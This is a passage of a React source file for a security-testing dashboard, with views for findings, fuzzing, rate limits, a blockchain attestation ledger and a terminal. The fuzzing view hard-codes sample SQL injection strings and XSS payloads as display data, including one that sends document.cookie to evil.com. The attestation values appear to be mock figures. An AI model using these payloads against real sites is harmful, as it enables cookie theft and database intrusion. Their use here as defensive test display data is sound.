                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                  <div>
                    <h3 className="text-sm font-bold text-white">SecTest Security Findings &amp; Proof Receipts</h3>
                    <p className="text-xs text-[#64748b]">Validated offensive vectors with verified cryptographic remediation</p>
                  </div>

                  {/* Filter Pills */}
                  <div className="flex items-center gap-1.5 overflow-x-auto pb-1 sm:pb-0">
                    {(["all", "sqli", "git", "xss", "ddos"] as const).map((cat) => (
                      <button
                        key={cat}
                        onClick={() => setFindingsFilter(cat)}
                        className={`px-3 py-1 rounded-full text-xs font-semibold capitalize transition-colors ${
                          findingsFilter === cat
                            ? "bg-[#2546ff] text-white"
                            : "bg-white/5 text-[#8a99ad] hover:text-white"
                        }`}
                      >
                        {cat}
                      </button>
                    ))}
                  </div>
                </div>

                {/* Table */}
                <div className="overflow-x-auto">
                  <table className="w-full text-left text-xs border-collapse">
                    <thead>
                      <tr className="border-b border-white/10 text-[#64748b] font-mono text-[11px]">
                        <th className="pb-3 px-3">Vulnerability / Finding</th>
                        <th className="pb-3 px-3">Category</th>
                        <th className="pb-3 px-3">Severity</th>
                        <th className="pb-3 px-3">Status</th>
                        <th className="pb-3 px-3">Proof Hash</th>
                        <th className="pb-3 px-3 text-right">Actions</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-white/5">
                      {filteredFindings.map((f) => (
                        <tr key={f.id} className="hover:bg-white/[0.02] transition-colors">
                          <td className="py-3 px-3">
                            <div className="font-semibold text-white">{f.title}</div>
                            <div className="text-[11px] text-[#64748b] font-mono">{f.id} • {f.cwe} • {f.endpoint}</div>
                          </td>
                          <td className="py-3 px-3">
                            <span className="px-2 py-0.5 rounded text-[10px] font-mono font-semibold uppercase bg-[#4d8eff]/15 text-[#93c5fd]">
                              {f.category}
                            </span>
                          </td>
                          <td className="py-3 px-3">
                            <span
                              className={`px-2 py-0.5 rounded text-[10px] font-bold uppercase ${
                                f.severity === "critical"
                                  ? "bg-[#f43f5e]/20 text-[#f43f5e] border border-[#f43f5e]/30"
                                  : f.severity === "high"
                                  ? "bg-[#fb923c]/20 text-[#fb923c] border border-[#fb923c]/30"
                                  : "bg-[#facc15]/20 text-[#facc15] border border-[#facc15]/30"
                              }`}
                            >
                              {f.severity}
                            </span>
                          </td>
                          <td className="py-3 px-3">
                            <span className="inline-flex items-center gap-1.5 text-[11px] font-semibold text-[#4ade80]">
                              <CheckCircle2 className="w-3.5 h-3.5" />
                              {f.status}
                            </span>
                          </td>
                          <td className="py-3 px-3">
                            <button
                              onClick={() => copyToClipboard(f.proofHash, f.id)}
                              className="font-mono text-[11px] text-[#b8caff] hover:underline flex items-center gap-1"
                              title="Click to copy SHA-256 Digest"
                            >
                              {f.proofHash}
                              {copiedProof === f.id ? <Check className="w-3 h-3 text-[#4ade80]" /> : <Copy className="w-3 h-3 opacity-60" />}
                            </button>
                          </td>
                          <td className="py-3 px-3 text-right">
                            <button
                              onClick={() => setSelectedFinding(f)}
                              className="px-2.5 py-1 rounded bg-white/5 hover:bg-[#2546ff] text-white text-[11px] font-semibold transition-colors border border-white/10"
                            >
                              Inspect
                            </button>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>
            </motion.div>
          )}

          {/* VIEW: GIT AUDIT */}
          {currentView === "git-audit" && (
            <motion.div initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} className="space-y-6">
              <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                {/* Commit Stream List */}
                <div className="p-5 rounded-2xl bg-[#0a0d15]/90 border border-white/10 backdrop-blur-xl space-y-3">
                  <div className="flex items-center justify-between pb-2 border-b border-white/5">
                    <h3 className="text-sm font-bold text-white">Repository Commit Stream</h3>
                    <span className="text-xs text-[#8a99ad] font-mono">{SAMPLE_COMMITS.length} commits</span>
                  </div>

                  <div className="space-y-2">
                    {SAMPLE_COMMITS.map((c) => (
                      <div
                        key={c.hash}
                        onClick={() => setSelectedCommit(c)}
                        className={`p-3 rounded-xl cursor-pointer transition-all border ${
                          selectedCommit.hash === c.hash
                            ? "bg-[#2546ff]/15 border-[#2546ff]/40 shadow-[0_0_15px_rgba(37,70,255,0.2)]"
                            : "bg-white/5 border-white/5 hover:border-white/15"
                        }`}
                      >
                        <div className="flex items-center justify-between mb-1">
                          <span className="font-mono text-xs font-bold text-[#4d8eff]">{c.shortHash}</span>
                          <span className="text-[10px] text-[#64748b]">{c.date}</span>
                        </div>
                        <div className="text-xs font-medium text-white line-clamp-1">{c.message}</div>
                        <div className="text-[11px] text-[#8a99ad] mt-1">{c.author} • branch {c.branch}</div>
                      </div>
                    ))}
                  </div>
                </div>

                {/* Diff & AST Analysis Pane */}
                <div className="lg:col-span-2 p-5 rounded-2xl bg-[#0a0d15]/90 border border-white/10 backdrop-blur-xl space-y-4">
                  <div className="flex items-center justify-between pb-3 border-b border-white/5">
                    <div>
                      <h3 className="text-sm font-bold text-white font-mono">{selectedCommit.shortHash} — {selectedCommit.message}</h3>
                      <p className="text-xs text-[#64748b]">Committed by {selectedCommit.author} ({selectedCommit.authorEmail})</p>
                    </div>
                    <Link
                      href="/commit-analysis"
                      className="px-3 py-1.5 rounded-lg bg-[#2546ff] hover:bg-[#0d27c7] text-white text-xs font-semibold transition-colors flex items-center gap-1"
                    >
                      <span>Full Split Workspace</span> <ExternalLink className="w-3.5 h-3.5" />
                    </Link>
                  </div>

                  {/* Diff Block */}
                  <div className="p-4 rounded-xl bg-[#06080d] border border-white/5 font-mono text-xs leading-relaxed overflow-x-auto max-h-96">
                    <pre className="text-[#8a99ad]">
                      {selectedCommit.diff.split("\n").map((line, idx) => {
                        const isAdd = line.startsWith("+");
                        const isDel = line.startsWith("-");
                        return (
                          <div
                            key={idx}
                            className={`px-2 py-0.5 rounded ${
                              isAdd
                                ? "bg-[#22c55e]/10 text-[#86efac]"
                                : isDel
                                ? "bg-[#f43f5e]/10 text-[#fca5a5]"
                                : "text-[#8a99ad]"
                            }`}
                          >
                            {line}
                          </div>
                        );
                      })}
                    </pre>
                  </div>
                </div>
              </div>
            </motion.div>
          )}

          {/* VIEW: FUZZING */}
          {currentView === "fuzzing" && (
            <motion.div initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div className="p-5 rounded-2xl bg-[#0a0d15]/90 border border-white/10 backdrop-blur-xl space-y-4">
                  <div className="flex items-center justify-between pb-3 border-b border-white/5">
                    <div className="flex items-center gap-2.5">
                      <Bug className="w-4 h-4 text-[#4d8eff]" />
                      <h3 className="text-sm font-bold text-white">SQL Injection Dynamic Blind Matrix</h3>
                    </div>
                    <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-[#22c55e]/15 text-[#4ade80]">Protected</span>
                  </div>
                  <div className="space-y-2">
                    {[
                      { payload: "' OR 1=1; --", status: "Sanitized", latency: "12ms" },
                      { payload: "'; WAITFOR DELAY '0:0:5'--", status: "Sanitized", latency: "14ms" },
                      { payload: "UNION SELECT null, username, password FROM users--", status: "Sanitized", latency: "11ms" },
                    ].map((row, i) => (
                      <div key={i} className="p-3 rounded-xl bg-[#06080d] border border-white/5 flex items-center justify-between text-xs">
                        <code className="text-[#93c5fd] font-mono">{row.payload}</code>
                        <div className="flex items-center gap-2">
                          <span className="text-[10px] text-[#64748b]">{row.latency}</span>
                          <span className="px-2 py-0.5 rounded text-[10px] font-semibold bg-[#22c55e]/15 text-[#4ade80]">{row.status}</span>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>

                <div className="p-5 rounded-2xl bg-[#0a0d15]/90 border border-white/10 backdrop-blur-xl space-y-4">
                  <div className="flex items-center justify-between pb-3 border-b border-white/5">
                    <div className="flex items-center gap-2.5">
                      <Bug className="w-4 h-4 text-[#b8caff]" />
                      <h3 className="text-sm font-bold text-white">DOM Cross-Site Scripting (XSS) Mutator</h3>
                    </div>
                    <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-[#22c55e]/15 text-[#4ade80]">Sanitized</span>
                  </div>
                  <div className="space-y-2">
                    {[
                      { payload: "<img src=x onerror=alert(document.cookie)>", status: "Filtered", latency: "9ms" },
                      { payload: "javascript:/*--></title></style>\"/></form>alert(1)", status: "Filtered", latency: "10ms" },
                      { payload: "<svg onload=fetch('//evil.com/'+document.cookie)>", status: "Filtered", latency: "12ms" },
                    ].map((row, i) => (
                      <div key={i} className="p-3 rounded-xl bg-[#06080d] border border-white/5 flex items-center justify-between text-xs">
                        <code className="text-[#b8caff] font-mono">{row.payload}</code>
                        <div className="flex items-center gap-2">
                          <span className="text-[10px] text-[#64748b]">{row.latency}</span>
                          <span className="px-2 py-0.5 rounded text-[10px] font-semibold bg-[#22c55e]/15 text-[#4ade80]">{row.status}</span>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            </motion.div>
          )}

          {/* VIEW: DDOS & RATE LIMITS */}
          {currentView === "ddos" && (
            <motion.div initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} className="space-y-6">
              <div className="grid grid-cols-1 sm:grid-cols-4 gap-4">
                <div className="p-5 rounded-2xl bg-[#0a0d15]/90 border border-white/10 text-center space-y-1">
                  <div className="text-3xl font-extrabold text-white font-mono">500</div>
                  <div className="text-xs text-[#8a99ad]">Concurrent Threads</div>
                </div>
                <div className="p-5 rounded-2xl bg-[#0a0d15]/90 border border-white/10 text-center space-y-1">
                  <div className="text-3xl font-extrabold text-[#4ade80] font-mono">14.2ms</div>
                  <div className="text-xs text-[#8a99ad]">Median Latency</div>
                </div>
                <div className="p-5 rounded-2xl bg-[#0a0d15]/90 border border-white/10 text-center space-y-1">
                  <div className="text-3xl font-extrabold text-[#f43f5e] font-mono">429</div>
                  <div className="text-xs text-[#8a99ad]">Rate Limiter Status</div>
                </div>
                <div className="p-5 rounded-2xl bg-[#0a0d15]/90 border border-white/10 text-center space-y-1">
                  <div className="text-3xl font-extrabold text-white font-mono">99.98%</div>
                  <div className="text-xs text-[#8a99ad]">Service Availability</div>
                </div>
              </div>
            </motion.div>
          )}

          {/* VIEW: BLOCKCHAIN LEDGER */}
          {currentView === "blockchain" && (
            <motion.div initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} className="space-y-6">
              <div className="p-6 rounded-2xl bg-[#0a0d15]/90 border border-white/10 space-y-6">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 p-5 rounded-xl bg-[#06080d] border border-white/10">
                  <div className="flex items-center gap-3">
                    <div className="p-3 rounded-xl bg-[#2546ff]/20 text-[#4d8eff] border border-[#2546ff]/30">
                      <Link2 className="w-6 h-6" />
                    </div>
                    <div>
                      <h3 className="text-base font-bold text-white">Immutable Polygon Mainnet Ledger</h3>
                      <p className="text-xs text-[#8a99ad]">Cryptographically anchored SHA-256 Merkle root receipts</p>
                    </div>
                  </div>
                  <button
                    onClick={() => setIsAttestationModalOpen(true)}
                    className="px-4 py-2 bg-[#2546ff] hover:bg-[#0d27c7] text-white text-xs font-semibold rounded-lg transition-colors border border-white/10 shadow-[0_0_15px_rgba(37,70,255,0.25)]"
                  >
                    View Official Certificate
                  </button>
                </div>

                <div className="space-y-3">
                  <div className="flex justify-between items-center py-2.5 border-b border-white/5 text-xs">
                    <span className="text-[#8a99ad]">Latest Block Height:</span>
                    <span className="font-mono text-white font-bold">#48,192,041</span>
                  </div>
                  <div className="flex justify-between items-center py-2.5 border-b border-white/5 text-xs">
                    <span className="text-[#8a99ad]">Network Consensus:</span>
                    <span className="font-mono text-[#4ade80]">Polygon PoS (Proof of Stake)</span>
                  </div>
                  <div className="flex justify-between items-center py-2.5 border-b border-white/5 text-xs">
                    <span className="text-[#8a99ad]">Merkle Root Digest:</span>
                    <code className="font-mono text-[#93c5fd]">0x8a9012f4b931e9c91039820fa929bc91030e8a7199201948</code>
                  </div>
                  <div className="flex justify-between items-center py-2.5 border-b border-white/5 text-xs">
                    <span className="text-[#8a99ad]">Signer Key Algorithm:</span>
                    <code className="font-mono text-[#b8caff]">ECDSA secp256k1</code>
                  </div>
                </div>
              </div>
            </motion.div>
          )}

          {/* VIEW: TERMINAL / TUI */}
          {currentView === "terminal" && (
            <motion.div initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} className="h-full flex flex-col space-y-3">
              <div className="flex-1 rounded-2xl bg-[#020408] border border-white/10 p-4 font-mono text-xs overflow-y-auto flex flex-col justify-between shadow-2xl">
                <div className="space-y-1 text-[#cbd5e1] leading-relaxed">
                  {terminalHistory.map((line, idx) => (
                    <div key={idx} className={line.startsWith("threatlens>") ? "text-[#4d8eff] font-bold" : line.startsWith("[✔]") ? "text-[#4ade80]" : "text-[#94a3b8]"}>
                      {line}
                    </div>
                  ))}
                  <div ref={terminalEndRef} />
                </div>

                <form onSubmit={handleTerminalSubmit} className="mt-4 pt-3 border-t border-white/10 flex items-center gap-2">
                  <span className="text-[#4d8eff] font-bold">threatlens&gt;</span>
                  <input
                    type="text"
                    value={terminalInput}
                    onChange={(e) => setTerminalInput(e.target.value)}
                    placeholder="Type a command ('help', 'audit', 'fuzz', 'ddos', 'prove', 'clear')..."
                    className="flex-1 bg-transparent border-none outline-none text-white font-mono text-xs placeholder-[#64748b]"
                    autoFocus
                  />
                </form>
              </div>
            </motion.div>
          )}
        </main>
      </div>

      {/* Finding Detail Inspection Modal */}
      <AnimatePresence>
        {selectedFinding && (
          <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-md flex items-center justify-center p-4">
            <motion.div
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.95 }}
              className="w-full max-w-2xl bg-[#0a0d15] border border-white/15 rounded-2xl p-6 shadow-2xl space-y-4 text-xs"
            >
              <div className="flex items-center justify-between pb-3 border-b border-white/10">
                <div className="flex items-center gap-2">
                  <span className="font-mono text-sm font-bold text-white">{selectedFinding.id}</span>
                  <span className="px-2 py-0.5 rounded text-[10px] font-bold uppercase bg-[#f43f5e]/20 text-[#f43f5e] border border-[#f43f5e]/30">
                    {selectedFinding.severity}
                  </span>
                </div>
                <button
                  onClick={() => setSelectedFinding(null)}
                  className="p-1 rounded text-[#8a99ad] hover:text-white"
                >
                  <X className="w-4 h-4" />
                </button>
              </div>

              <div>
                <h3 className="text-base font-bold text-white">{selectedFinding.title}</h3>
                <p className="text-[#8a99ad] mt-1">{selectedFinding.description}</p>
              </div>

              <div className="space-y-1">
                <div className="font-semibold text-white">Recommended AST Remediation:</div>
                <p className="text-[#94a3b8]">{selectedFinding.remediation}</p>
              </div>

              <div className="p-3 rounded-xl bg-[#06080d] border border-white/10 font-mono text-xs">
                <div className="text-[10px] text-[#64748b] mb-1">AST Patch Delta:</div>
                <pre className="text-[#4ade80]">{selectedFinding.diffSnippet}</pre>
              </div>

              <div className="flex justify-between items-center pt-2 border-t border-white/10 text-[#8a99ad]">
                <span>CWE Reference: <strong className="text-white">{selectedFinding.cwe}</strong></span>
                <span>Polygon Proof: <code className="text-[#b8caff]">{selectedFinding.proofHash}</code></span>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Attestation Certificate Modal */}
      <AnimatePresence>
        {isAttestationModalOpen && (
          <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-md flex items-center justify-center p-4">
            <motion.div
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.95 }}
              className="w-full max-w-lg bg-[#0a0d15] border border-white/15 rounded-2xl p-6 shadow-2xl space-y-4 text-xs"
            >
              <div className="flex items-center justify-between pb-3 border-b border-white/10">
                <div className="flex items-center gap-2">
                  <ShieldCheck className="w-5 h-5 text-[#4ade80]" />
                  <span className="font-bold text-sm text-white">ThreatLens Cryptographic Attestation Certificate</span>
                </div>
                <button
                  onClick={() => setIsAttestationModalOpen(false)}
                  className="p-1 rounded text-[#8a99ad] hover:text-white"
                >
                  <X className="w-4 h-4" />
                </button>
              </div>

              <div className="p-4 rounded-xl bg-[#06080d] border border-white/10 space-y-2 font-mono text-[11px]">
                <div className="text-[#8a99ad]">// Immutable Polygon Audit Receipt</div>
                <div><span className="text-[#64748b]">Engine:</span> ThreatLens SecTest v2.4</div>
                <div><span className="text-[#64748b]">Target:</span> github.com/ThreatLens/ThreatLens</div>
                <div><span className="text-[#64748b]">Commit:</span> 7f8a92b3c109d...</div>
                <div><span className="text-[#64748b]">Merkle Root:</span> 0x8a9012f4b931e9c91039820fa929bc91030e8a7199201948</div>
                <div><span className="text-[#64748b]">Block:</span> #48,192</div>
                <div><span className="text-[#64748b]">Status:</span> <span className="text-[#4ade80]">ANCHORED &amp; VERIFIED</span></div>
              </div>

              <div className="flex justify-end gap-2 pt-2">
                <button
                  onClick={() => setIsAttestationModalOpen(false)}
                  className="px-4 py-2 rounded-lg bg-white/5 hover:bg-white/10 text-white font-semibold"
                >
                  Close
                </button>
                <button
                  onClick={() => {
                    navigator.clipboard.writeText("0x8a9012f4b931e9c91039820fa929bc91030e8a7199201948");
                    setIsAttestationModalOpen(false);
                  }}
                  className="px-4 py-2 rounded-lg bg-[#2546ff] hover:bg-[#0d27c7] text-white font-semibold"
                >
                  Copy Proof Digest
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}
